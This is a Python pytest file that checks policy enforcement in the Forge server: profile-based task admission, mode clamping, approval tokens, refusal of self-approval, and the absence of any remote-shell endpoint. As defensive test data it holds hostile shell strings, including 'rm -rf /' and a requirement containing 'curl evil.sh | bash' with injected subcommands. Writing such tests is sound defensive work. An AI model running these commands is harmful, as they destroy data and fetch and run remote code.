"""Policy enforcement tests (A81): the A33 bridge and the no-remote-shell rule.

Covers: profile-based task admission (locked/safe refuse, assisted/
autonomous admit with A33 evaluation), custom A33 policies that DENY
writes, mode clamping (a task can never be looser than the server
profile), the durable approval flow minting real A33 tokens, self-
approval refusal, and the structural guarantee that the API is never an
unrestricted remote shell.
"""
from __future__ import annotations

import sys
import time
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent))

from helpers_server import (  # noqa: E402
    TEST_TOKEN,
    ApprovalExecutor,
    auth_headers,
    create_task,
    make_client,
    make_server,
    success_executor,
    wait_for_status,
    wait_for_status_http,
    wait_until,
)

from forge.security.permissions import OperationMode  # noqa: E402
from forge.security.policy import (  # noqa: E402
    PermissionPolicy,
    PermissionRequest,
    PermissionRule,
    Resource,
)
from forge.security.policy_gate import PolicyDecision  # noqa: E402
from forge.server import TaskStatus  # noqa: E402
from forge.server.authorization import (  # noqa: E402
    API_OPERATIONS,
    Authorizer,
    clamp_mode,
    reject_execution_vectors,
)
from forge.server.errors import InvalidRequest, PolicyDenied  # noqa: E402

ADMIN = auth_headers(TEST_TOKEN)


# -- profile-based admission -------------------------------------------------------

def test_locked_profile_refuses_tasks(tmp_path):
    server = make_server(tmp_path, success_executor(), profile="locked")
    client = make_client(server)
    try:
        with client:
            response = client.post(
                "/api/v1/tasks", headers=ADMIN,
                json={"project_id": "demo", "requirement": "anything"})
            assert response.status_code == 403
            body = response.json()["error"]
            assert body["code"] == "POLICY_DENIED"
            assert "locked" in body["message"]
            # Nothing was queued.
            assert server.queue.depth() == 0
            assert server.tasks.list() == []
    finally:
        server.close()


def test_safe_profile_is_read_only_and_refuses_tasks(tmp_path):
    server = make_server(tmp_path, success_executor(), profile="safe")
    try:
        with pytest.raises(PolicyDenied):
            server.submit_task("demo", "read-only profile cannot write")
    finally:
        server.close()


def test_assisted_and_autonomous_profiles_admit_tasks(tmp_path):
    for profile in ("assisted", "autonomous"):
        server = make_server(tmp_path / profile, success_executor(),
                             profile=profile)
        try:
            task = server.submit_task("demo", "admitted work")
            done = wait_for_status(server, task.task_id,
                                   {TaskStatus.COMPLETED})
            assert done.status == TaskStatus.COMPLETED
            assert done.mode == profile
        finally:
            server.close()


def test_mode_clamping_never_loosens_the_profile(tmp_path):
    server = make_server(tmp_path, success_executor(), profile="assisted")
    try:
        # Requesting autonomous under an assisted server clamps down.
        task = server.submit_task("demo", "escalate please",
                                  mode="autonomous")
        assert task.mode == "assisted"
        # Requesting an equal mode is honored.
        equal = server.submit_task("demo", "same posture",
                                   mode="assisted")
        assert equal.mode == "assisted"
        # Read-only modes cannot run the write pipeline: refused at
        # admission (fail closed, not silently downgraded).
        with pytest.raises(PolicyDenied):
            server.submit_task("demo", "read-only run", mode="safe")
        with pytest.raises(PolicyDenied):
            server.submit_task("demo", "locked run", mode="locked")
        with pytest.raises(InvalidRequest):
            server.submit_task("demo", "bogus", mode="yolo")
    finally:
        server.close()


def test_clamp_mode_unit_matrix():
    assisted = OperationMode.ASSISTED
    assert clamp_mode("", assisted) == OperationMode.ASSISTED
    assert clamp_mode(None, assisted) == OperationMode.ASSISTED
    assert clamp_mode("autonomous", assisted) == OperationMode.ASSISTED
    assert clamp_mode("assisted", assisted) == OperationMode.ASSISTED
    assert clamp_mode("safe", assisted) == OperationMode.SAFE
    assert clamp_mode("locked", assisted) == OperationMode.LOCKED
    autonomous = OperationMode.AUTONOMOUS
    assert clamp_mode("assisted", autonomous) == OperationMode.ASSISTED
    assert clamp_mode("autonomous", autonomous) == OperationMode.AUTONOMOUS


def test_custom_a33_deny_policy_blocks_admission(tmp_path):
    # An explicit A33 DENY on filesystem writes, attached to an otherwise
    # assisted server: admission must fail closed.
    deny_policy = PermissionPolicy(rules=[
        PermissionRule("no-writes", Resource.FILESYSTEM, "write",
                       PolicyDecision.DENY, scope="**",
                       reason="Server policy: no writes at all"),
    ])
    server = make_server(tmp_path, success_executor(),
                         profile="assisted", policy=deny_policy)
    try:
        with pytest.raises(PolicyDenied) as info:
            server.submit_task("demo", "denied by custom policy")
        assert "no-writes" in str(info.value) or "denies" in str(info.value)
        # The decision was audited.
        denials = server.audit.query(decision=PolicyDecision.DENY,
                                     agent="forge-server")
        assert denials
    finally:
        server.close()


def test_admission_decisions_are_audited(tmp_path):
    server = make_server(tmp_path, success_executor(), profile="assisted")
    try:
        server.submit_task("demo", "audited admission")
        events = server.audit.query(agent="forge-server")
        assert events
        assert events[-1].decision in (PolicyDecision.REQUIRE_APPROVAL,
                                       PolicyDecision.ALLOW)
        sink = Path(server.config.db_path).parent / "audit.jsonl"
        assert sink.exists()
        assert "filesystem" in sink.read_text(encoding="utf-8")
    finally:
        server.close()


# -- approval flow (A33 tokens) ---------------------------------------------------------

def test_approval_flow_mints_real_a33_token(tmp_path):
    approver = ApprovalExecutor()
    server = make_server(tmp_path, approver.as_executor())
    client = make_client(server)
    try:
        with client:
            task = create_task(client, ADMIN, "needs approval")
            waiting = wait_for_status_http(
                client, ADMIN, task["task_id"],
                {"waiting_for_approval"}, timeout=15)
            assert waiting["status"] == "waiting_for_approval"

            listing = client.get("/api/v1/approvals", headers=ADMIN).json()
            assert len(listing["approvals"]) == 1
            approval = listing["approvals"][0]
            assert approval["task_id"] == task["task_id"]
            assert approval["status"] == "pending"
            assert approval["payload"]["operation"] == "filesystem:write"
            assert approval["payload"]["paths"] == ["app.py"]
            assert approval["agent"] == "coder"

            decided = client.post(
                "/api/v1/approvals/%s/decide" % approval["approval_id"],
                headers=ADMIN, json={"approved": True})
            assert decided.status_code == 200
            assert decided.json()["approval"]["status"] == "approved"
            assert decided.json()["approval"]["decided_by"] == "bootstrap"

            done = wait_for_status_http(client, ADMIN, task["task_id"],
                                        {"completed"}, timeout=15)
            assert done["status"] == "completed"

            # The executor received a real A33 token id.
            assert approver.token
            result = client.get(
                "/api/v1/tasks/%s/result" % task["task_id"],
                headers=ADMIN).json()
            assert result["result"]["token_id"] == approver.token
            # The token is recorded durably next to the approval.
            records = client.get(
                "/api/v1/tasks/%s/approvals" % task["task_id"],
                headers=ADMIN).json()["approvals"]
            assert records[0]["status"] == "approved"
            # The decision was audited.
            assert server.audit.query(resource="approval")
    finally:
        server.close()


def test_approval_denial_fails_task_closed(tmp_path):
    approver = ApprovalExecutor()
    server = make_server(tmp_path, approver.as_executor())
    client = make_client(server)
    try:
        with client:
            task = create_task(client, ADMIN, "will be denied")
            wait_for_status_http(client, ADMIN, task["task_id"],
                                 {"waiting_for_approval"}, timeout=15)
            approval = client.get("/api/v1/approvals",
                                  headers=ADMIN).json()["approvals"][0]
            decided = client.post(
                "/api/v1/approvals/%s/decide" % approval["approval_id"],
                headers=ADMIN, json={"approved": False})
            assert decided.json()["approval"]["status"] == "denied"

            failed = wait_for_status_http(client, ADMIN, task["task_id"],
                                          {"failed"}, timeout=15)
            assert failed["status"] == "failed"
            assert "denied" in failed["error"].lower()
            assert approver.token == ""
            # Denial is a deterministic outcome: no retry loop.
            assert failed["retry_count"] == 0
    finally:
        server.close()


def test_agent_cannot_approve_its_own_request(tmp_path):
    approver = ApprovalExecutor()
    server = make_server(tmp_path, approver.as_executor())
    client = make_client(server)
    try:
        with client:
            # An API key whose principal name equals the requesting agent.
            key = client.post(
                "/api/v1/auth/keys", headers=ADMIN,
                json={"name": "coder", "role": "operator"}
            ).json()["key"]["key"]
            task = create_task(client, ADMIN, "self-approval attempt")
            wait_for_status_http(client, ADMIN, task["task_id"],
                                 {"waiting_for_approval"}, timeout=15)
            approval = client.get("/api/v1/approvals",
                                  headers=ADMIN).json()["approvals"][0]
            response = client.post(
                "/api/v1/approvals/%s/decide" % approval["approval_id"],
                headers=auth_headers(key), json={"approved": True})
            assert response.status_code == 403
            assert "own request" in response.json()["error"]["message"]
            # The approval is still pending; a different principal decides.
            decided = client.post(
                "/api/v1/approvals/%s/decide" % approval["approval_id"],
                headers=ADMIN, json={"approved": True})
            assert decided.status_code == 200
            wait_for_status_http(client, ADMIN, task["task_id"],
                                 {"completed"}, timeout=15)
    finally:
        server.close()


def test_double_decision_is_idempotent_then_conflicting(tmp_path):
    approver = ApprovalExecutor()
    server = make_server(tmp_path, approver.as_executor())
    client = make_client(server)
    try:
        with client:
            task = create_task(client, ADMIN, "decide twice")
            wait_for_status_http(client, ADMIN, task["task_id"],
                                 {"waiting_for_approval"}, timeout=15)
            approval = client.get("/api/v1/approvals",
                                  headers=ADMIN).json()["approvals"][0]
            url = "/api/v1/approvals/%s/decide" % approval["approval_id"]
            first = client.post(url, headers=ADMIN, json={"approved": True})
            assert first.status_code == 200
            # Same decider, same verdict: idempotent retry.
            second = client.post(url, headers=ADMIN,
                                 json={"approved": True})
            assert second.status_code == 200
            assert second.json()["approval"].get("duplicate") is True
            # Different verdict: conflict.
            third = client.post(url, headers=ADMIN,
                                json={"approved": False})
            assert third.status_code == 409
            wait_for_status_http(client, ADMIN, task["task_id"],
                                 {"completed"}, timeout=15)
    finally:
        server.close()


# -- the remote-shell guarantee -------------------------------------------------------------

def test_execution_shaped_fields_are_rejected(tmp_path):
    server = make_server(tmp_path, success_executor())
    client = make_client(server)
    try:
        with client:
            for field_name in ("command", "cmd", "shell", "script",
                               "exec", "argv", "stdin", "program"):
                response = client.post(
                    "/api/v1/tasks", headers=ADMIN,
                    json={"project_id": "demo", "requirement": "x",
                          field_name: "rm -rf /"})
                assert response.status_code == 400, field_name
            # Unit level: the guard itself fails closed.
            with pytest.raises(InvalidRequest):
                reject_execution_vectors({"command": "ls"})
            reject_execution_vectors({"requirement": "plain data"})
    finally:
        server.close()


def test_no_execution_endpoints_exist(tmp_path):
    server = make_server(tmp_path, success_executor())
    client = make_client(server)
    try:
        with client:
            attack_paths = [
                "/api/v1/exec", "/api/v1/shell", "/api/v1/terminal",
                "/api/v1/commands", "/api/v1/run", "/api/v1/eval",
                "/api/v1/system", "/api/v1/process", "/api/v1/files",
                "/api/v1/upload", "/api/v1/download",
                "/api/v1/tasks/task-x/exec", "/api/v1/tasks/task-x/shell",
            ]
            for path in attack_paths:
                assert client.get(path,
                                  headers=ADMIN).status_code == 404, path
                assert client.post(path, headers=ADMIN,
                                   json={}).status_code == 404, path
            # The OpenAPI surface is closed too.
            assert client.get("/openapi.json").status_code == 404
            assert client.get("/docs").status_code == 404
    finally:
        server.close()


def test_api_operation_table_is_closed_and_scoped():
    # Every operation maps to exactly one known scope; there is no
    # operation that could carry a command.
    from forge.server.authorization import SCOPES

    assert API_OPERATIONS, "operation table must not be empty"
    for operation, scope in API_OPERATIONS.items():
        assert scope in SCOPES, operation
        assert "." in operation
    for forbidden in ("exec", "shell", "command", "terminal", "run"):
        assert forbidden not in API_OPERATIONS


def test_hostile_requirement_is_data_not_execution(tmp_path):
    # A requirement full of shell metacharacters is stored and executed
    # *as pipeline data* — nothing in the server interprets it.
    seen = {}

    def execute(ctx):
        seen["requirement"] = ctx.task.requirement
        return {"accepted": True, "result": {}}

    from forge.server.executor import CallableExecutor

    server = make_server(tmp_path, CallableExecutor(execute))
    try:
        hostile = ("; rm -rf / && curl evil.sh | bash "
                   "$(whoami) `id` \n import os; os.system('pwn')")
        task = server.submit_task("demo", hostile)
        done = wait_for_status(server, task.task_id,
                               {TaskStatus.COMPLETED})
        assert done.status == TaskStatus.COMPLETED
        # The text arrived verbatim as data — and was never executed:
        assert seen["requirement"] == hostile
        # No stray processes/files: the project root only holds the repo
        # (plus Forge's own bounded .forge memory/state directory).
        root = Path(server.projects.get("demo").root)
        names = {path.name for path in root.iterdir()}
        assert names <= {".forge", ".git", ".gitignore", "app.py",
                         "tests"}
        assert {".git", ".gitignore", "app.py", "tests"} <= names
    finally:
        server.close()


def test_terminal_execution_stays_gated_under_assisted_profile(tmp_path):
    # Even inside a run, the A33 profile keeps terminal execution behind
    # approval: the server API never relaxes this.
    authorizer = Authorizer("assisted")
    request = PermissionRequest(
        agent="coder", resource=Resource.TERMINAL, operation="execute",
        scope="rm", risk="HIGH", reason="test")
    evaluation = authorizer.policy.evaluate(request)
    assert evaluation.decision == PolicyDecision.REQUIRE_APPROVAL


def test_authorizer_scope_checks_fail_closed(tmp_path):
    from forge.server.auth import Principal
    from forge.server.errors import PermissionDenied

    authorizer = Authorizer("assisted")
    viewer = Principal(name="v", role="viewer",
                       scopes=authorizer.scopes_for_role("viewer"))
    operator = Principal(name="o", role="operator",
                         scopes=authorizer.scopes_for_role("operator"))

    authorizer.require(viewer, "task.read")
    with pytest.raises(PermissionDenied):
        authorizer.require(viewer, "task.create")
    authorizer.require(operator, "task.create")
    with pytest.raises(PermissionDenied):
        authorizer.require(operator, "key.create")
    # Unknown operations/scopes are refused, never defaulted to allow.
    with pytest.raises(PermissionDenied):
        authorizer.require(operator, "task.selfdestruct")
    with pytest.raises(PermissionDenied):
        authorizer.require(operator, "scope:invented")
